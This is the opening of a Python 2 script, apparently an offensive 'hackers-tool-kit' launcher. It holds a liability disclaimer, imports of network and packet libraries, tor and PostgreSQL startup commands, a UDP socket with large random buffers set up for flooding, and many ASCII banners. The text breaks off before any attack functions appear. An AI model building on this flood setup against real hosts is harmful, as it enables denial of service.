#!/usr/local/bin/python
# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to show / edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
"""


 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░    ░ ░  ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░    
                  ░                       ░      


"""
#WARNING START#
#-------------#
from tkinter import *
win = Tk() 
warn ='I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED WITH THIS TOOL WHATEVER YOU DO WITH THIS TOOL IS ON YOU'
messageVar = Message(win, text = warn) 
messageVar.config(bg='red') 
messageVar.pack( ) 
win.title('HTK:  Warning!') 
button = Button(win, text='OK', width=25, command=win.destroy) 
button.pack() 
win.mainloop() 
#-----------#
#WARNING END#

#this is the loading screen \ the imports START#
#----------------------------------------------#
import os
print "Starting hackers-tool-kit...  [ * ]-[0%]"
import platform
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[5%]"
import webbrowser
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[9%]"
import hashlib
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[14%]"
import subprocess
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[19%]"
import zipfile
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[23%]"
import colorama
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[25%]"
from modules import *
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[26%]"
import modules.colors
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[27%]"
import builtwith
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[29%]"
from urllib2 import urlopen
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[31%]"
from urllib2 import URLError
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[34%]"
from urllib2 import HTTPError
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[38%]"
from urllib import urlencode
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[39%]"
from plugins.DNSDumpsterAPI import DNSDumpsterAPI
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[41%]"
import whois
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[45%]"
import json
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[47%]"
from urlparse import urlparse
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[50%]"
from re import search, sub
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[55%]"
import cookielib
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[56%]"
import socket
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[59%]"
from scapy.all import *
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[60%]"
from threading import Thread, active_count
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[63%]"
import random
import readline
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[67%]"
import string
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[70%]"
import signal
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[73%]"
import ssl  
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[79%]"
import argparse
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[83%]"
import sys
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[86%]"
import socks
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[89%]"
import mechanize
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[90%]"
import requests
os.system("clear")
print "Starting hackers-tool-kit...  [  *]-[94%]"
import time
os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[96%]"
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
os.system("clear")
print "Starting hackers-tool-kit...  [*  ]-[99%]"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)
#COLOR VARIABLES START#
#---------------------#
r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
Bl = '\033[30m'
O = '\033[33m'
p = '\033[35m'
#-------------------#
#COLOR VARIABLES END#

os.system("clear")
print "Starting hackers-tool-kit...  [ * ]-[100%]   [ \033[1m\033[32mREADY \033[0m]"
os.system("printf '\033]2;Hackers-Tool-Kit | HTK | @tuf_unkn0wn\a'")
os.system("service tor start")
os.system("service postgresql start")
os.system("clear")
#----------------------------------------------#
#this is the loading screen \ the imports END#


#MAIN STARTING BANNER START#
#--------------------------#
def mainbanner1():
	os.system("cat /root/hackers-tool-kit/tools/htkbanner.txt | lolcat")
	print N+"""\033[34m   
		..............           \033[0mtype ? for help\033[34m                         
			    ..,;:ccc,.                             
			  ......''';lxO.                           
		.....''''..........,:ld;                           
			   .';;;:::;,,.x,                          
		      ..'''.            0Xxoc:,.  ...               
		  ....                ,ONkc;,;cokOdc',.            
		 .                   OMo           ':ddo.          
				    dMc               :OO;          
				    0M.                 .:o.       
				    ;Wd                            
				     ;XO, 			\033[93mCreated By @tuf_unkn0wn On Instagram\033[34m                         
				       ,d0Odlc;,..                 
				           ..',;:cdOOd::,.        
				                    .:d;.':;.     
				                       'd,  .'     
				                         ;l   ..    
				                          .o       
				                            c
				                            .'                             
				                             .\033[92m
			 ▄▄    ▄▄            ▄▄▄▄▄▄▄▄            ▄▄   ▄▄▄ 
			 ██    ██            ▀▀▀██▀▀▀            ██  ██▀  
			 ██    ██               ██               ██▄██    
			 ████████               ██               █████    
			 ██    ██   █████       ██      █████    ██  ██▄  
			 ██    ██               ██               ██   ██▄ 
			 ▀▀    ▀▀               ▀▀               ▀▀    ▀▀\033[0m 
			 ▒ ░░▒░▒▒   ▓▒█░░   ░▒ ▒░▒   ▒▒ ▓▒░░▒    ░ ▒▓ ░▒▓
			 ▒ ░▒░ ░    ▒▒ ░    ░  ▒ ░   ░▒ ▒░ ░░      ░▒ ░ ▒
			 ░  ░░ ░    ▒  ░        ░   ░░ ░   ░      ░░   ░ 
			 ░  ░  ░    ░  ░       ░      ░    ░      ░   ░          
	""".decode('utf-8')
def mainbanner2():
	print """
    type ? for help
\033[92m
     ▄█   ▄█   ▄█  
     ███  ███  ███  
     ███▌ ███▌ ███▌ 
     ███▌ ███▌ ███▌ 
     ███▌ ███▌ ███▌ 
     ███  ███  ███  
     ███  ███  ███  
     █▀   █▀   █▀   

 ┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐┌─┐
 ├─┤├─┤│  ├┴┐├┤ ├┬┘└─┐\033[90m
 ┴ ┴┴ ┴└─┘┴ ┴└─┘┴└─└─┘
 ┌┬┐┌─┐┌─┐┬   ┬┌─┬┌┬┐\033[92m 
  │ │ ││ ││───├┴┐│ │  
  ┴ └─┘└─┘┴─┘ ┴ ┴┴ ┴ \033[0m
Created By @tuf_unkn0wn 
	""".decode('utf-8')
def mainbanner3():
	print """\033[91m
	▒\033[90m██   ██\033[91m▒      ▒\033[90m██   ██\033[91m▒      
	▒▒ \033[90m█ █ \033[91m▒░      ▒▒ \033[90m█ █ \033[91m▒░      
	░░  \033[90m█   \033[91m░      ░░  \033[90m█   \033[91m░      
	 ░ \033[90m█ █ \033[91m▒        ░ \033[90m█ █ \033[91m▒       
	▒\033[90m██\033[91m▒ ▒\033[90m██\033[91m▒      ▒\033[90m██\033[91m▒ ▒\033[90m██\033[91m▒      
	▒▒ ░ ░▓ ░      ▒▒ ░ ░▓ ░      
	░░   ░▒ ░      ░░   ░▒ ░      
	 ░    ░         ░    ░        
	 ░    ░         ░    ░        
	\033[90m

	  ████████████████████
	 ██                  ██\033[91m
	 ▒▒                  ▒▒
	 ░░                  ░░
	  ░                  ░
	  ░                  ░\033[0m

888    888      88888888888      888    d8P  
888    888          888          888   d8P   
888    888          888          888  d8P \033[1;36m   
8888888888          888          888d88K     
888    888          888          8888888b\033[0m    
888    888 888888   888   888888 888  Y88b   
888    888          888          888   Y88b  
888    888          888          888    Y88b 
   Created By @tuf_unkn0wn On Instagram
             type ? for help
	""".decode('utf-8')
def mainbanner4():
	print P+"""
	 .S    S.         sdSS_SSSSSSbs         .S    S.   
	.SS    SS.        YSSS~S%SSSSSP        .SS    SS.  
	S%S    S%S             S%S             S%S    S&S  
	S%S    S%S             S%S             S%S    d*S  
	S%S SSSS%S             S&S             S&S   .S*S  
	S&S  SSS&S             S&S             S&S_sdSSS   
	S&S    S&S             S&S             S&S~YSSY%b  
	S&S    S&S             S&S             S&S    `S%  
	S*S    S*S             S*S             S*S     S%  
	S*S    S*S             S*S             S*S     n&  
	S*S    S*S             S*S             S*S    wS&  
	SSS    S*S             S*S             S*S   0 SS  
	   h   SP              SP              SP   n       
	    a  Y               Y               Y   k       
	     c                                    n            
	      k e r s - t o o l - k i t  by @tuf_u\033[0m

                        type ? for help
	""".decode('utf-8')
def mainbanner5():
	print R+"""
   ██▀███   ▄▄▄      ▒███████▒ ▒█████   ██▀███  
  ▓██ ▒ ██▒▒████▄    ▒ ▒ ▒ ▄▀░▒██▒  ██▒▓██ ▒ ██▒
  ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██░  ██▒▓██ ░▄█ ▒
  ▒██▀▀█▄  ░██▄▄▄▄██   ▄▀▒   ░▒██   ██░▒██▀▀█▄  
  ░██▓ ▒██▒ ▓█   ▓██▒▒███████▒░ ████▓▒░░██▓ ▒██▒
  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░▒ ░ ▒░  ▒   ▒▒ ░░░▒ ▒ ░ ▒  ░ ▒ ▒░   ░▒ ░ ▒░
    ░░   ░   ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ▒    ░░   ░ 
     ░           ░  ░  ░ ░        ░ ░     ░     
                     ░\033[0m                          
 .,,,,,,,,,,.,,,.....,...........................
 ...,...,....,.,..,......,,,,.......,.,,,,,,,.,,,
 ..,......,.....,,.,........,,...........,,.,....
  ...,.,,.,....,,,,..,..,,,,,,......,,.,...,..../
  ***********************//***/***//**/**********
      ******************   ******************             @tuf_unkn0wn
      *,*****,*,********   ***,**************    
  **,,,,,,,,,,,,,,*,,,,,   *,,,,,,,,,*,,,,,,,,,**        type ? for help
  ,,,,,,,,,,,,,,,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,
  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
  ***********************************************\033[91m

        ▄████▄   █    ██ ▄▄▄█████▓  ██████ 
       ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▒██    ▒ 
       ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░░ ▓██▄   
       ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░   ▒   ██▒
       ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ▒██████▒▒
       ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ▒ ▒▓▒ ▒ ░
       ░  ▒   ░░▒░ ░ ░     ░    ░ ░▒  ░ ░
       ░         ░░░ ░ ░   ░      ░  ░  ░  
       ░ ░         ░                    ░  
       ░  \033[0m                                 
	""".decode('utf-8')
def mainbanner6():
	print """
		  |-|____________________
		 /|_|_\ /__,''___ /____ /|
		 |\033[90mHHHHHH\033[0m|   \_/   |\033[90mHHHHH\033[0m|/|
		 |``````|_________|`````| |
		 |    \033[93m~~~~~~~~~~~~~~\033[0m    | |
		 |        .-/\-,        | |
		 |        _\\//_        | |
		 |       \033[92m|  /(_)|\033[0m       | |
		 |\033[92m_______|_||.-.|_______\033[0m|/|
		 |\033[90mHHHHHHH\033[0m| ||:_ |\033[90mHHHHHHH\033[0m|/|
		 |\033[92m```````|_||:_)|```````\033[0m| |
		 |       \033[92m|______|       \033[0m| |
		 |        ______        | |
		 |       (__\033[90m24\033[0m__)       | |
		 |       ~~~~~~~~       | |
		 |   By @tuf_unkn0wn    | |
		 |______________________|/
	\033[91m                                                                                               
	    ) (             )   (                      
	 ( /( )\   )     ( /(   )\  (        (  (      
	 )\()|(_| /(  (  )\()) ((_)))\  (    )\))( (   
	((_)\ _ )(_)) )\((_)\   _ /((_) )\ )((_))\ )\  
	| |(_) ((_)_ ((_) |(_) | (_))( _(_/( (()(_|(_) 
	| '_ \ / _` / _|| / /  | | || | ' \)) _` |(_-< 
	|_.__/_\__,_\__||_\_\  |_|\_,_|_||_|\__, |/__/ 
		                            |___/      
	\033[90m
		      )
		     (\033[33m
	 _ \033[0m___________ \033[90m)\033[33m
	[_[\033[0m___________\033[91m#\033[0m 
	type ? for help  
	""".decode('utf-8')
def mainbanner7():
	os.system("cat /root/hackers-tool-kit/tools/skull.txt")
def mainbanner8():
	print """
             type ? for help\033[91m

@@@             /$$   /$$            @@@  
@@@            | $$  | $$            @@@
@@!            | $$  | $$            @@!
!@!            | $$$$$$$$            !@!
!!@            | $$__  $$            !!@
!!!            | $$  | $$            !!!
!!:            | $$  | $$            !!:
:!:            |__/  |__/            :!:
@@@                                  @@@\033[94m
@@@                                  @@@
@@!                                  @@!
!@!             /$$$$$$$$            !@!
!!@            |__  $$__/            !!@
!!!               | $$               !!!
!!:               | $$               !!:
:!:---------------| $$---------------:!:
@@@               | $$               @@@
@@@               | $$               @@@
@@!               |__/               @@!
!@!                                  !@!\033[91m
!!@                                  !!@
!!!             /$$   /$$            !!!
!!:            | $$  /$$/            !!:
:!:            | $$ /$$/             :!:
@@@            | $$$$$/              @@@
@@@            | $$  $$              @@@
@@!            | $$\  $$             @@!
!@!            | $$ \  $$            !@!
!!@            |__/  \__/            !!@
!!!                                  !!!
!!:                                  !!:
:!:                                  :!:\033[92m
 ::                                   ::
:             @tuf_unkn0wn           :\033[0m
"""
def mainbanner9():
	print """
\033[91m╔\033[0m██████████████████████████████████████████████████████████████████\033[91m═╗
║                                                                   ║
\033[33m║                                                                   ║
║\033[0m        ▄▀▀▀▀▄  ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄ ▄▀▄     \033[33m║
\033[93m║\033[0m       █ █   ▐ █   ▀▄ ▄▀ █ █   ▐ █    █  ▐ ▐  ▄▀   ▐ █  █ ▀  █     \033[93m║
║\033[0m          ▀▄   ▐     █      ▀▄   ▐   █       █▄▄▄▄▄  ▐  █    █     \033[93m║
\033[92m║\033[0m       ▀▄   █        █   ▀▄   █     █        █    ▌    █    █      \033[92m║
║\033[0m        █▀▀▀       ▄▀     █▀▀▀    ▄▀        ▄▀▄▄▄▄   ▄▀   ▄▀       \033[92m║
\033[1;36m║\033[0m        ▐          █      ▐      █          █    ▐   █    █        \033[1;36m║
║\033[0m                   ▐             ▐          ▐        ▐    ▐        \033[1;36m║
\033[94m║\033[0m            ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀▄ ▀▄                \033[94m║
║\033[0m           █ ▄▀   █ █      █ █   █    ▐  █ █  █ █ █               \033[94m ║
\033[34m║\033[0m           ▐ █    █ █      █ ▐  █        █ ▐  █  ▀█                \033[34m║
║\033[0m             █    █ ▀▄    ▄▀   █   ▄    █    █   █                 \033[34m║
\033[95m║\033[0m            ▄▀▄▄▄▄▀   ▀▀▀▀      ▀▄▀ ▀▄ ▄▀  ▄▀   █                  \033[95m║
║\033[0m           █     ▐                    ▀    █    ▐                  \033[95m║
\033[35m║\033[0m           ▐                               ▐                       \033[35m║
║                                                                   ║\033[1;31m
╚═\033[0m█████████████████████████████████████████████████████████████████\033[1;31m═╝\033[0m
                       type ? for help
	""".decode('utf-8')

def mainbanner10():
	print """\033[0m
		                        ░░░▓█▒░▒▒▒▓▓░                                  
		                  ░░░░░▓▓░▒▓▓▓▓▓▓▓▓▓▓▓█░░░░                            
		                  ░░█▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░                            
		               ░░█▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░                         
		      ░░░░  ░░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░              ░░░░      
		     ░░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████▒░░         ░░▓▒▒▒▒▓░░   
		   ░▓░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████████▓░░░░░▒▓▓▓▓▓▓███████
		 ░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████████████████░░░░░░░
		░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓▓██████████████████████████████████░       
		░█▓▓▓██████████▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████████████████████████▒░       
	       ░▒▓▓▓████░░░░░░░░░░░░░▒▓███████████████████████████████████████░░       
	       ░▓▓▓███▒▒░░░░░░░░░░░░░░░░░░░░▒██▓██████████████████████████████░░       
	      ░█▓▓███░░░░░░░░░░░░░░░░░░░░░░░░░░░▒███████████████████████████▓░         
	     ░█▓▓███▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████░░░░░░░░░          
	    ░░▓▓████░░░░░░░░░░░░░░░░░░░░████▓░░░░░░░░█████████████▓░                   
	    ░█▓█████░░░░░░░░░░░░░░░░░▒░████████░░░░░░░████████████░░                   
	   ░░▒▓█████░░░░▒░▓████░░░░░░▒░█████████▓░░░░░███████████▓░░░░░                
	  ░░▓▒▓█████░░░▒░▓██████░░░░░▒░▓█████████░░░░░▒██████████░░▒▒▓░                
	  ░░█▒▓▓████▒░░░░███████▓░░░░░▒░░████████▓░░░░▒████████░▓░▓▓░▓▓░░░             
	  ░░░▒▓▓▓████░░░░▓██████▓░░░░░░▒░░░▓█████░░░░░███████▓░▓▓▓▓▓▓▒▒░░░             
	    ░▒▒▓▓████░░▒░░██████░░░░░░░░░▒░░░░░░▒░░░░░████▓░▒▓▓▓▓▓░░░▒▒▒░▒░            
	     ░░▓▓████░░░▒░░▒███░░▒▓▒▒█▓░░░░░░░░░░░░░▒██▓▒▓▓▓▓▓▓▒░░░░░░▒▒▒▒▒░░          
	     ░░░░████░░░░░░░░░░░░░█░░▓█▓░░░░██████████▒▒▓▓▓▓░░░░░▒░░░░░▒▒▒▒▒░          
	 ░░░░░░ ░░████░░░░░░░░░░░░░░░░░░░░░░███████▓▒▓▓░░░░░░░   ░░░░░░░▒▒▒░▒░         
	░▒░░▒░░░▒░▒█████▓▒░▒█░░░░░░░░░░░░░░░░███▓▒▓▒░░             ░▒░░░░▒▒▒░░░░       
	░░▒░▒░░░░░░░██████████░░░░░░▒░░░▒░░▒▒▒▒▒▒▒░░░               ░▒░░░░▒▒░▒░░       
	▒░░░░░▒▒▒░░░░░░██████░░▒▒▒▒▒▒▒▒▒▓█▓▓▒▒▓▓▓█░                 ░░▒░░░░▒▒▒░░       
	 ░░░░░░▒▒░░░░       ░░▓▓▓▓▓▓▓█▓▓▒▒▓▓█▓▓▓▓▓█   \033[92m@tuf_unkn0wn\033[0m    ░░░░░░░▒░░░       
	  ░░▒░░░░░▒▓█     ░▒▒▓▓▓▓█▓█▓▓▒▒▓▓██▓▓▓▓▓▓█   \033[94mtype ? for help\033[0m  ░░░░░▒▒░░       
	     ░▒░░░░█▓██▒░▒▓▓██▓▒▒▒▒▓▒▓▓████▓▓▓▓▓██▒                    ▒░░░░░▒░░       
	       ░░▓▒█▓▓▓▓▓▓▓██▓▒▒░▒▒▒▒█▓▓███▓▓▓▓▓▓█░                    ▒░░░░▒░         
	       ░▒███▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒░▒████▓▓▓▓▓▓▒░                    ▒░░░░░          
	       ░████▓▓▓▓▓▓▓▒▓▓▓▓█▒▒░░▒░█▓█▓█▓████░                     ▒░░▒░░          
	       ░▓██▓▓▓▓▓▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓█▓▓▓▓██▒░                    ░░▒░             
	       ░░██▓▓▒▓▓██▓▓▓▓▓▓▓▓▓████▓▓▓▓█▓▓█░░░                                     
		░██▓▓███▒▓▓▓▓▓▓▓▓▓█████▓██▓██░░                                        
		░░█▓█░░ ░▒▒▓▓▓▓▓▓▓▓▓███▓██▓█░                                          
		  ▓█░    ░█▓▓▓▓▓▓▓▓▓████▓███░ ░                                        
		         ░█▓▓▓▓▓▓███████▓██▓██░                                        
		         ░██▓▓▓████████████████░░░                                     
		         ░▓▓▓▓▓███████▓█▓████████░      ░░░                            
		       ░░░█▓█████████████████████████▓▓▓▒░░░░░░                        
		   ░░░▒█▓█▓██████████████████████▓███████████████░░░░░░░░░             
		  ▓█▒▓▓▓▓▓▓█████████████████████████████████████████████████░          
		░█▓▓▓▓▓▓▓▓▓█████████████████████████████████████▒░░░  ░  ░░░░          
		         ░░▓█▓█▓█████████████████████████████░░                       
	\033[0m""".decode('utf-8')
def mainbanner11():
	print """\033[91m
            ██████╗  ██████╗  ██████╗ 
           ██╔════╝ ██╔════╝ ██╔════╝ 
           ███████╗ ███████╗ ███████╗ 
           ██╔═══██╗██╔═══██╗██╔═══██╗
           ╚██████╔╝╚██████╔╝╚██████╔╝
            ╚═════╝  ╚═════╝  ╚═════╝ 
     ░░░░                           ░░░░░       
   ░▒███████▓▒░░                 ░░░████████▓░░░ 
  ░▓████████████▒░░            ░░█████████████░░ 
  ▒▓░   ░░████████░░         ░░████████░░░ ░░▒█░ 
  ░         ░██████▒░     ░░░░███████         ░░ 
            ░░███████░░    ░░██████▓░            
              ░███████░░  ░▒██████▒              
  ░░░░        ░░███████░░░███████▒░          ░░░ 
 ░░░░░        ░░░███████░████████░░░   ░░░ ░░░░  
  ░░▓████▓▒░░░░▒▒███████████████░░░░░░░▒▓████░ ░ 
    ░▒██████████████▒████████▒██████████████░░   
     ░░██████████████▒░███▒▒▒█████████████░░     
         ░░░░▓████████░█░▓▓▒████████▒░░░░░       
            ░░████████▓░██░████████▒░░░          
            ░░▒██████░▒▒░░▒░░██████░             
            ░░█████████▓░█░████▓███▓░            
            ░▒█▓░▒██████▒███████░░█▓░            
            ░░░███████████████████▓░░            
              ░▒▓████████████████▒░              
              ░░▒███████████████▓▒░              
                 ░▒█████▓██████░░                
                   ░██████████░                  
   @tuf_unkn0wn    ░█████████▒    type ? for help             
                    █████████░░                  
                   ░░████████░░                  
                    ░▓█████▓░                    
                     ░▓████▒░                    
                     ░░████░                     
                    ░░░▒██░░                     
                       ░█▓░                      
                      ░░▓░░                      
                      ░░░░░                      
                        ░░                    
	\033[0m""".decode('utf-8')
def mainbanner12():
	print """\033[91m


██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗      ██╗  ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ██║ ██╔╝██║╚══██╔══╝
███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╗██║   ██║   ██║██║   ██║██║█████╗█████╔╝ ██║   ██║   
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║╚════╝██║   ██║   ██║██║   ██║██║╚════╝██╔═██╗ ██║   ██║   
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ ██║  ██╗██║   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   
                                                                                                                  

	""".decode('utf-8')
def mainbanner13():
	print """\033[92m


██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗      ██╗  ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ██║ ██╔╝██║╚══██╔══╝
███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╗██║   ██║   ██║██║   ██║██║█████╗█████╔╝ ██║   ██║   
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║╚════╝██║   ██║   ██║██║   ██║██║╚════╝██╔═██╗ ██║   ██║   
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ ██║  ██╗██║   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   
                                                                                                                  

	""".decode('utf-8')
def mainbanner14():
	print """\033[34m


██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗      ██╗  ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ██║ ██╔╝██║╚══██╔══╝
███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╗██║   ██║   ██║██║   ██║██║█████╗█████╔╝ ██║   ██║   
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║╚════╝██║   ██║   ██║██║   ██║██║╚════╝██╔═██╗ ██║   ██║   
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ ██║  ██╗██║   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   


	""".decode('utf-8')
def mainbanner15():
	print """\033[93m
                         __    _                                   
                    _wr""        "-q__                             
                 _dP                 9m_     
               _#P                     9#_                         
              d#@    \033[92mtype ? for help\033[93m    9#m                        
             d##                         ###                       
            J###                         ###L                      
            {###K                       J###K                      
            ]####K      ___aaa___      J####F                      
        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
     _g##############mZ_         __g##############m_               
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
  a###""          ,Z"#####@" '######"\g          ""M##m            
 J#@"             0L  "*##     ##@"  J#              *#K           
 #"               `#    "_gmwgm_~    dF               `#_          
7F                 "#_   ]#####F   _dK                 JE          
]                    *m__ ##### __g@"                   F          
      \033[92m@tuf_unkn0wn\033[93m     "PJ#####LP"  \033[92mhackers-tool-kit\033[93m                             
 `                       0######_                      '           
                       _0########_                                   
     .               _d#####^#####m__              ,              
      "*w_________am#####P"   ~9#####mw_________w*"                  
          ""9@#####@M""           ""P@#####@M""                    
\033[92m
                 ██░ ██ ▄▄▄█████▓ ██ ▄█▀
                ▓██░ ██▒▓  ██▒ ▓▒ ██▄█▒ 
                ▒██▀▀██░▒ ▓██░ ▒░▓███▄░ 
                ░▓█ ░██ ░ ▓██▓ ░ ▓██ █▄ 
                ░▓█▒░██▓  ▒██▒ ░ ▒██▒ █▄
                 ▒ ░░▒░▒  ▒ ░░   ▒ ▒▒ ▓▒
                 ▒ ░▒░ ░    ░    ░ ░▒ ▒░
                 ░  ░░ ░  ░      ░ ░░ ░ 
                 ░  ░  ░         ░  ░\033[0m   
	""".decode('utf-8')      
def mainbanner16():
	print """\033[91m
                      :PB@Bk:
                  ,jB@@B@B@B@BBL.
               7G@B@B@BMMMMMB@B@B@Nr
           :kB@B@@@MMOMOMOMOMMMM@B@B@B1,
       :5@B@B@B@BBMMOMOMOMOMOMOMM@@@B@B@BBu.
    70@@@B@B@B@BXBBOMOMOMOMOMOMMBMPB@B@B@B@B@Nr
  G@@@BJ iB@B@@  OBMOMOMOMOMOMOM@2  B@B@B. EB@B@S
  @@BM@GJBU.  iSuB@OMOMOMOMOMOMM@OU1:  .kBLM@M@B@
  B@MMB@B       7@BBMMOMOMOMOMOBB@:       B@BMM@B
  @@@B@B         7@@@MMOMOMOMM@B@:         @@B@B@
  @@OLB.          BNB@MMOMOMM@BEB          rBjM@B
  @@  @           M  OBOMOMM@q  M          .@  @@
